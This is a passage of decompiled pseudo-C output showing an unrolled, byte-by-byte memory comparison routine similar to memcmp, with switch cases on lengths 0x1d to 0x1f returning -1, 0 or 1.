{\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x12) - *(arg_ch + arg_10h + -0x12);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x11) - *(arg_ch + arg_10h + -0x11);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00408fbf:\n                uVar1 = *(arg_8h + arg_10h + -0x10);\n                if (uVar1 != *(arg_ch + arg_10h + -0x10)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x10);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xf) - *(arg_ch + arg_10h + -0xf);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xe) - *(arg_ch + arg_10h + -0xe);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xd) - *(arg_ch + arg_10h + -0xd);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00409052:\n                uVar1 = *(arg_8h + arg_10h + -0xc);\n                if (uVar1 != *(arg_ch + arg_10h + -0xc)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0xc);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xb) - *(arg_ch + arg_10h + -0xb);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -10) - *(arg_ch + arg_10h + -10);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -9) - *(arg_ch + arg_10h + -9);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x004090e5:\n                uVar1 = *(arg_8h + arg_10h + -8);\n                if (uVar1 != *(arg_ch + arg_10h + -8)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -8);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -7) - *(arg_ch + arg_10h + -7);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -6) - *(arg_ch + arg_10h + -6);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -5) - *(arg_ch + arg_10h + -5);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00409178:\n                uVar1 = *(arg_8h + arg_10h + -4);\n                if (uVar1 != *(arg_ch + arg_10h + -4)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -4);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -3) - *(arg_ch + arg_10h + -3);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -2) - *(arg_ch + arg_10h + -2);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -1) - *(arg_ch + arg_10h + -1);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\n                break;\n            case 0x1d:\n                uVar1 = *(arg_8h + arg_10h + -0x1d);\n                if (uVar1 != *(arg_ch + arg_10h + -0x1d)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1d);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1c) - *(arg_ch + arg_10h + -0x1c);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1b) - *(arg_ch + arg_10h + -0x1b);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1a) - *(arg_ch + arg_10h + -0x1a);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\n            case 0x19:\n                if (*(arg_8h + arg_10h + -0x19) != *(arg_ch + arg_10h + -0x19)) {\n                    iVar2 = *(arg_8h + arg_10h + -0x19) - *(arg_ch + arg_10h + -0x19);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x18) - *(arg_ch + arg_10h + -0x18);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x17) - *(arg_ch + arg_10h + -0x17);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x16) - *(arg_ch + arg_10h + -0x16);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00409318:\n                uVar1 = *(arg_8h + arg_10h + -0x15);\n                if (uVar1 != *(arg_ch + arg_10h + -0x15)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x15);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x14) - *(arg_ch + arg_10h + -0x14);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x13) - *(arg_ch + arg_10h + -0x13);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x12) - *(arg_ch + arg_10h + -0x12);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x004093ab:\n                uVar1 = *(arg_8h + arg_10h + -0x11);\n                if (uVar1 != *(arg_ch + arg_10h + -0x11)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x11);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x10) - *(arg_ch + arg_10h + -0x10);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xf) - *(arg_ch + arg_10h + -0xf);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xe) - *(arg_ch + arg_10h + -0xe);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x0040943e:\n                uVar1 = *(arg_8h + arg_10h + -0xd);\n                if (uVar1 != *(arg_ch + arg_10h + -0xd)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0xd);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xc) - *(arg_ch + arg_10h + -0xc);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xb) - *(arg_ch + arg_10h + -0xb);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -10) - *(arg_ch + arg_10h + -10);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x004094d1:\n                uVar1 = *(arg_8h + arg_10h + -9);\n                if (uVar1 != *(arg_ch + arg_10h + -9)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -9);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -8) - *(arg_ch + arg_10h + -8);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -7) - *(arg_ch + arg_10h + -7);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -6) - *(arg_ch + arg_10h + -6);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00409564:\n                if (*(arg_8h + arg_10h + -5) != *(arg_ch + arg_10h + -5)) {\ncode_r0x00409570:\n                    iVar2 = *(arg_8h + arg_10h + -5) - *(arg_ch + arg_10h + -5);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -4) - *(arg_ch + arg_10h + -4);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\ncode_r0x004095b4:\n                    iVar2 = *(arg_8h + arg_10h + -3) - *(arg_ch + arg_10h + -3);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\ncode_r0x004095d6:\n                    iVar2 = *(arg_8h + arg_10h + -2) - *(arg_ch + arg_10h + -2);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x004095f8:\n                uVar1 = *(arg_ch + arg_10h + -1);\n                uVar3 = *(arg_8h + arg_10h + -1);\n                if (uVar3 == uVar1) {\n                    return 0;\n                }\n                return (0 < uVar3 - uVar1) * 2 + -1;\n            case 0x1e:\n                uVar1 = *(arg_8h + arg_10h + -0x1e);\n                if (uVar1 != *(arg_ch + arg_10h + -0x1e)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1e);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1d) - *(arg_ch + arg_10h + -0x1d);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1c) - *(arg_ch + arg_10h + -0x1c);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1b) - *(arg_ch + arg_10h + -0x1b);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x004096ae:\n                uVar1 = *(arg_8h + arg_10h + -0x1a);\n                if (uVar1 != *(arg_ch + arg_10h + -0x1a)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1a);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x19) - *(arg_ch + arg_10h + -0x19);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x18) - *(arg_ch + arg_10h + -0x18);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x17) - *(arg_ch + arg_10h + -0x17);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00409741:\n                uVar1 = *(arg_8h + arg_10h + -0x16);\n                if (uVar1 != *(arg_ch + arg_10h + -0x16)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x16);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x15) - *(arg_ch + arg_10h + -0x15);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x14) - *(arg_ch + arg_10h + -0x14);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x13) - *(arg_ch + arg_10h + -0x13);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x004097d4:\n                uVar1 = *(arg_8h + arg_10h + -0x12);\n                if (uVar1 != *(arg_ch + arg_10h + -0x12)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x12);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x11) - *(arg_ch + arg_10h + -0x11);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x10) - *(arg_ch + arg_10h + -0x10);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xf) - *(arg_ch + arg_10h + -0xf);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00409867:\n                uVar1 = *(arg_8h + arg_10h + -0xe);\n                if (uVar1 != *(arg_ch + arg_10h + -0xe)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0xe);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xd) - *(arg_ch + arg_10h + -0xd);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xc) - *(arg_ch + arg_10h + -0xc);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xb) - *(arg_ch + arg_10h + -0xb);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x004098fa:\n                if (*(arg_8h + arg_10h + -10) != *(arg_ch + arg_10h + -10)) {\n                    iVar2 = *(arg_8h + arg_10h + -10) - *(arg_ch + arg_10h + -10);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -9) - *(arg_ch + arg_10h + -9);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -8) - *(arg_ch + arg_10h + -8);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -7) - *(arg_ch + arg_10h + -7);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x0040998e:\n                uVar1 = *(arg_8h + arg_10h + -6);\n                if (uVar1 != *(arg_ch + arg_10h + -6)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -6);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -5) - *(arg_ch + arg_10h + -5);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -4) - *(arg_ch + arg_10h + -4);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -3) - *(arg_ch + arg_10h + -3);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00409a21:\n                if (*(arg_8h + arg_10h + -2) != *(arg_ch + arg_10h + -2)) goto code_r0x004095d6;\n                break;\n            case 0x1f:\n                uVar1 = *(arg_8h + arg_10h + -0x1f);\n                if (uVar1 != *(arg_ch + arg_10h + -0x1f)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1f);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1e) - *(arg_ch + arg_10h + -0x1e);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1d) - *(arg_ch + arg_10h + -0x1d);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1c) - *(arg_ch + arg_10h + -0x1c);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00409ac7:\n                uVar1 = *(arg_8h + arg_10h + -0x1b);\n                if (uVar1 != *(arg_ch + arg_10h + -0x1b)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1b);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1a) - *(arg_ch + arg_10h + -0x1a);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x19) - *(arg_ch + arg_10h + -0x19);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x18) - *(arg_ch + arg_10h + -0x18);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00409b5a:\n                uVar1 = *(arg_8h + arg_10h + -0x17);\n                if (uVar1 != *(arg_ch + arg_10h + -0x17)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x17);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x16) - *(arg_ch + arg_10h + -0x16);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x15) - *(arg_ch + arg_10h + -0x15);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x14) - *(arg_ch + arg_10h + -0x14);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00409bed:\n                if (*(arg_8h + arg_10h + -0x13) != *(arg_ch + arg_10h + -0x13)) {\n                    iVar2 = *(arg_8h + arg_10h + -0x13) - *(arg_ch + arg_10h + -0x13);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x12) - *(arg_ch + arg_10h + -0x12);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x11) - *(arg_ch + arg_10h + -0x11);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x10) - *(arg_ch + arg_10h + -0x10);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00409c81:\n                uVar1 = *(arg_8h + arg_10h + -0xf);\n                if (uVar1 != *(arg_ch + arg_10h + -0xf)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0xf);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xe) - *(arg_ch + arg_10h + -0xe);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xd) - *(arg_ch + arg_10h + -0xd);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xc) - *(arg_ch + arg_10h + -0xc);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00409d14:\n                uVar1 = *(arg_8h + arg_10h + -0xb);\n                if (uVar1 != *(arg_ch + arg_10h + -0xb)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0xb);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -10) - *(arg_ch + arg_10h + -10);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -9) - *(arg_ch + arg_10h + -9);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -8) - *(arg_ch + arg_10h + -8);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00409da7:\n                if (*(arg_8h + arg_10h + -7) != *(arg_ch + arg_10h + -7)) {\n                    iVar2 = *(arg_8h + arg_10h + -7) - *(arg_ch + arg_10h + -7);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -6) - *(arg_ch + arg_10h + -6);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    goto code_r0x00409570;\n                }\n                goto code_r0x004095b4;\n            default:\n                goto code_r0x00408956;\n            }\n            return 0;\n        }\n        iVar2 = *arg_8h - *arg_ch;\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 1) - *(arg_ch + 1);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 2) - *(arg_ch + 2);\n        if (iVar2 != 